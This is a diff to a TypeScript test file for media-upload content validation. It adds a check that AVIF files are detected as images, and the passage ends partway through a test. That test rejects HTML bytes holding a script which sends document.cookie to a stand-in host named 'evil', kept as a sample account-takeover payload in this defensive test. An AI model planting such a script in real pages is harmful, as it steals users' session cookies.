@@ -16,13 +16,25 @@ import {
   resolveMediaWriteTarget,
   validateAndSanitizeMediaBytes,
 } from '../importMediaValidation'
+import { detectAcceptedMime, EXTENSION_FOR_MIME, IMAGE_MIMES } from '../mediaUpload'
 
 const enc = new TextEncoder()
 
 // PNG 8-byte magic signature — enough for `detectAcceptedMime` to classify.
 const PNG_MAGIC = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01])
+const AVIF_MAGIC = new Uint8Array([
+  0x00, 0x00, 0x00, 0x1c,
+  0x66, 0x74, 0x79, 0x70,
+  0x61, 0x76, 0x69, 0x66,
+])
 
 describe('validateAndSanitizeMediaBytes — content gate', () => {
+  it('accepts AVIF as an image upload instead of misclassifying it as MP4', () => {
+    expect(detectAcceptedMime(AVIF_MAGIC)).toBe('image/avif')
+    expect(Object.entries(EXTENSION_FOR_MIME)).toContainEqual(['image/avif', '.avif'])
+    expect(IMAGE_MIMES).toContain('image/avif')
+  })
+
   it('rejects HTML/script bytes (no accepted media MIME) — the account-takeover payload', () => {
     const html = enc.encode('<!DOCTYPE html><script>fetch("//evil/?c="+document.cookie)</script>')
     expect(() =>
